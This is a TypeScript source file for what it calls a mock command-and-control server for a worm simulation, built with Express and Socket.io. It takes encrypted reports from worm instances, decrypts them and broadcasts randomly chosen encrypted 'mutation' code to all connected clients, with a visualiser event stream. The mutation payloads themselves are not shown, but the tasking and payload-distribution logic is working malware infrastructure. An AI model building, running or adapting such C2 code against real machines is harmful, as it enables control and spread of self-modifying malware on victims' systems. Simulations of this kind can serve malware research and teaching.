// Fix: Use a standard ES module import for Express and explicitly import Request and Response types
// to avoid conflicts with global DOM types.
import express, { Request, Response } from 'express';
import { createServer } from 'http';
import { Server } from 'socket.io';
import { logger } from './utils/logger';
import { encrypt, decrypt } from './modules/crypto';
import { MUTATIONS } from './modules/mutations';

const app = express();
const httpServer = createServer(app);
const io = new Server(httpServer, {
    cors: {
        origin: "*", // Allow all origins for this simulation
    }
});

const PORT = process.env.C2_PORT || 4000;

// Fix: Correctly typing `app` by using the right import syntax for Express
// resolves overload errors on `app.use`.
app.use(express.json());

// Endpoint for worms to report failures
// Fix: Explicitly typing `req` and `res` with Express's types resolves
// errors like "property 'body' does not exist" and "property 'status' does not exist".
app.post('/api/report', (req: Request, res: Response) => {
    // Worms must provide their instance ID, encrypted log, and the key used for encryption.
    const { instanceId, payload, key } = req.body;
    
    if (!instanceId || !payload || !key) {
        logger.warn('C2 Server: Received invalid report (missing instanceId, payload, or key).');
        return res.status(400).send('Invalid report format');
    }

    try {
        const decryptedReport = decrypt(payload, key);
        if (!decryptedReport) {
            throw new Error('Decryption failed, payload may be malformed or key is incorrect.');
        }
        logger.info(`C2 Server: Received valid report from instance ${instanceId}: ${JSON.stringify(decryptedReport)}`);
        
        // VISUALIZER EVENT: Notify UI about the received report.
        io.emit('worm_event', {
            type: 'report',
            instanceId,
            data: decryptedReport,
        });

        // This simulates the "tasking" part. Based on the report, we broadcast a mutation to all connected clients.
        // Select a random mutation from our library to broadcast.
        const selectedMutation = MUTATIONS[Math.floor(Math.random() * MUTATIONS.length)];
        
        logger.info(`C2 Server: Broadcasting mutation to all clients.`);
        
        // Encrypt the mutation code with the key the worm just provided.
        const encryptedCode = encrypt({ code: selectedMutation }, key);
        
        // Broadcast the encrypted payload and the key needed to decrypt it.
        io.emit('update', { payload: encryptedCode, key });
        
        // VISUALIZER EVENT: Notify UI about the broadcasted mutation.
        io.emit('worm_event', {
            type: 'mutation',
            instanceId,
            data: { mutation: selectedMutation.substring(0, 100) + '...' } // Send a snippet
        });

        res.status(200).json({ message: 'Report received and mutation broadcasted.' });

    } catch (e: any) {
        logger.error(`C2 Server: Failed to process report from ${instanceId}. Error: ${e.message}`);
        res.status(500).send('Error processing report.');
    }
});

io.on('connection', (socket) => {
    logger.info(`C2 Server: Client connected: ${socket.id}`);
    
    // VISUALIZER EVENT: Notify UI a new worm has connected.
    io.emit('worm_event', {
        type: 'connect',
        instanceId: socket.id,
        data: { wormCount: io.engine.clientsCount }
    });

    socket.on('disconnect', () => {
        logger.info(`C2 Server: Client disconnected: ${socket.id}`);
        // VISUALIZER EVENT: Notify UI a worm has disconnected.
        io.emit('worm_event', {
            type: 'disconnect',
            instanceId: socket.id,
            data: { wormCount: io.engine.clientsCount }
        });
    });
});

httpServer.listen(PORT, () => {
    logger.info(`Mock C2 server is listening on http://localhost:${PORT}`);
});
